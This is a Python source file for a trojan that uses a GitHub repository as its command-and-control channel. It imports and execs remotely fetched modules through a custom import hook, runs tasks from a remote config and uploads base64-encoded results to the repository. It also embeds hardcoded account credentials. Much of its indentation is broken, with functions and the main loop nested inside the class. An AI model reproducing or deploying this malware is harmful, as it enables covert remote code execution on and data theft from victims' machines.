# git_trojan.py
import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os
from github3 import login
     
trojan_id = "test"
     
trojan_config = "module_list.json"
data_path = 'data/{}/'.format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()
     
class GitImporter:
    def __init__(self):
        self.module_code = None
     
    def find_module(self,fullname,path=None):
        if configured:
            print("[*] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fullname))
     
            if new_library is not None:
                self.module_code = new_library
                return self
     
        return None
     
    def load_module(self,name):
        module = imp.new_module(name)
        exec(self.module_code, module.__dict__)
        sys.modules[name] = module
     
        return module
     
    def connect_to_github():
        gh = login(username='sgs01115', password='b4mp2w38')
        repo = gh.repository('sgs01115', 'trojan')
        branch = repo.branch('master')
     
        return gh, repo, branch
     
    def get_file_contents(filepath):
        gh, repo, branch = connect_to_github()
        if gh and repo and branch:
            hash_list = branch.commit.commit.tree.to_tree().recurse()
     
            for hash in hash_list.tree:
                if filepath in hash.path:
                    print("[*] Found file {}".format(filepath))
                    file_contents_b64 = repo.blob(hash.sha).content
                    file_contents = base64.b64decode(file_contents_b64).decode('utf-8')
                    return file_contents
     
        return None
     
    def get_trojan_config():
        global configured
        config_json = get_file_contents(trojan_config)
        config = json.loads(config_json)
        configured = True
     
        for task in config:
            module = task['module']
            if module not in sys.modules:
                exec('import {}'.format(module))
     
        return config
     
    def store_module_result(data):
        gh, repo, branch = connect_to_github()
        remote_path = "data/{}/{}.data".format(trojan_id, random.randint(1000, 100000))
        repo.create_file(remote_path, "Commit message", base64.b64encode(data.encode()))
        return
     
    def module_runner(module):
        task_queue.put(1)
        result = sys.modules[module].run()
        task_queue.get()
     
        store_module_result(result)
     
        return
     
    sys.meta_path = [GitImporter()]
     
    while True:
        if task_queue.empty():
            config = get_trojan_config()
            for task in config:
                t = threading.Thread(target=module_runner,args=(task['module'],))
                t.start()
                time.sleep(random.randint(1,10))
     
        #time.sleep(random.randint(1000,10000))
        time.sleep(180)